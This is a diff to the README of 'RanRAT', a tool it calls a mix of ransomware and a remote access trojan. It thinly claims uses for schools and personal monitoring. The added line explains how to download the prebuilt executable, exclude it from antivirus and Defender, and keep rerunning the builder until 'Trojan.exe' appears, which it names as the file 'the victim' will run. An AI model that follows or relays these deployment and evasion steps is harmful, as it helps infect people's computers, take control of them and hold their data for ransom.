@@ -7,6 +7,7 @@
 - School/Institutions , for students
 - Personal Control and File Backup , Make sure no one is using your computer when you are away.
 - Other Noble Purposes
+# the releases "exe" folder contains a released [Trusted] version , you can easily download it and run it , [But Exclude from antivirus / defender] (All tools like this are filtered by companies) , and important tip : if there is an error "save out" message box says error build trojan path , run the command again , till you see file "Trojan.exe" appears on Desktop, that is the trojan / client that the victim / will run it
 
 # How to Use : https://www.youtube.com/watch?v=SiWHrPaNUOQ
 RanRAT is a simple combination between the ransomware and the RAT [Remote Access Trojan] , This tool has better visual effects , also has good control to victims , but has only the ordinary options 
